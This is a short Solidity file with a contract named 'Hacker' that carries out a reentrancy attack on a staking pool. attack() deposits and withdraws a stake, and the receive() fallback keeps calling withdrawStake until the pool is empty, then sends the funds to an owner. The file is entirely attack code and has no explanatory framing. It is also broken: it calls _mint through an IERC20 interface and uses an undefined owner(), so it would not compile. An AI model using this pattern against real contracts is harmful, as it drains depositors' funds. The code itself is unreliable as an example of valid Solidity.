 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol"; 
 interface IStakingPool{

        function depositStake(uint256 amount)external;
    function withdrawStake(uint256 amount,uint256 id)external; 
 }

 contract Hacker{
    uint256 amount=1 ether;
    IERC20 public token;
    IStakingPool public immutable poolContract;
    constructor(address _poolContract,address _tokenAddress){
        token=IERC20(_tokenAddress);
        poolContract=IStakingPool(_poolContract);
    }
    function attack()external {
        poolContract.depositStake(amount);
        poolContract.withdrawStake(amount,1);
        token._mint(address(this),50 * 10 ** 18);
    }
    
    receive()external payable{
        if(token.balanceOf(address(poolContract))>0){
         poolContract.withdrawStake(amount,1);
        }   
        else{
            payable(owner()).transfer(address(this).balance);
        }
    }
 }